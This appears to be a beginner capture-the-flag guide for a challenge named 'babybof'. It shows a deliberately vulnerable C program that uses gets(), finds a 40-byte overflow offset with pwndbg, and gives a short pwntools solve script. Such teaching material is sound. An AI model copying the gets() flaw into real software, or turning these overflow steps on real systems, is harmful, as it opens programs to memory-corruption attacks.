# Challenge Name
babybof

## Learning Objective
Understand:
1. segmentation fault
2. buffer overflow
3. `gets` vulnerability

## Description 
Master this and further concepts will be easy.

## Difficulty:
Guided (Easy)

## Guide
Let's look at the source code:

In `main`:

```c
    // runs sigsegv_trigger() when a segmentation fault occurs
    signal(SIGSEGV, sigsegv_trigger);
```

From the code comment, we need to trigger a **segmentation fault** to run `sigsegv_trigger` function.

In `sigsegv_trigger`:

```c
    printf("Here is your flag: \n");
    FILE *file = fopen("flag.txt", "r");
    char flag[256];
    fgets(flag, 256, file);
    printf("%s", flag);
    fclose(file);
```

This function will give us our flag. How do we start?

### `gets` vulnerability

In `vuln`:

```c
    // vulnerable c function
    gets(buffer);
```

One of the most common C vulnerabilities. This function does not perform boundary checking, which means it will accept user input even if it is beyond allocated size.

### Buffer overflow

To put it simply, let's say a basket can hold 10 apples at maxmimum. But if I were to try and put 20 apples, some of these apples will overflow. You would then need to use another basket.

In programs, excess bytes will overflow into other values/addresses on the stack memory. 

### What is Segmentation Fault? How does it happen?

This is an error that occurs when a program attempts to access memory that is **not permitted to the user**. 



For example: reading/writing outside given boundaries (aka Buffer overflow).

There are 2 important addresses in a stack frame that is **not permitted** to us:
1. saved base pointer (RBP) address
2. return address

**HOWEVER**, it is important to note that if you overwrite the addresses with a existing/valid address in the binary, it will continue running but with the overwritten address.

Let's try to overflow the **base pointer address** since it is always closer to the buffer.


### Find number of bytes to overflow base pointer address

1. Open program with pwndbg
```shell
$> gdb chall
```

2. Generate the cyclic pattern of 100 bytes (or any number big enough to cause a segmentation fault) & copy the output
```shell
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaa...
```

3. Run the program and paste when prompted
```shell
pwndbg> run
``` 

You should be able to observe this in the registers:
```shell
 RBP  0x6161616161616165 ('eaaaaaaa')
 RSP  0x7fffffffdc48 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
```

This was from our cyclic pattern. This pattern helps us to identify how many bytes we need **before** it goes into whichever part of the stack we want.

In 64-bit programs, after the `RBP` is overflowed, the remaining will go into the `RSP` register.

So in this case,`faaaaaaa` will point to us how many bytes we need to **completely** overwrite saved RBP address.

Let's identify how many bytes we need with the following command below:
```shell
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

### Manual Exploit 
Let's put 40 bytes of input (in this case I will put 40 `A`s) into the program, let's see what happens
```shell
$> ./chall
Hello World!
Enter some text: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation Fault!
Here is your flag: 
CTF{PLACEHOLDER} 
```

We got the flag!

### Script solve
In furher exercises, we will be using python script to solve. This is where `pwntools` will come in.

1. Import the library
```python
from pwn import *
```

2. Depending on whether you want to solve locally or remotely, add either of the following:
```python
# local solve
p = process("./chall")

# remote solve
p = process("IP", PORT)
```

3. Since we want to send 40 `A`s:
```python
payload = b'A' * 40
p.sendline(payload)
```

4. Interact with the service
```python
p.interactive()
```

When we put all that together u should get this:
```python
from pwn import *

# setup process
p = remote("ip", port)

# payload 
payload = b'A' * 40

# send payload
p.sendline(payload)
p.interactive()
```

Run in your terminal to solve:
```shell
$> python3 script.py
```

## Solution
Refer to solve.py.

## Hints
1. What causes segmentation fault? 
2. Have you considered saved RBP address?

## Attached Files
- chall.c
- chall

## Resources
- http://ctf101.org

## Flag
TBD
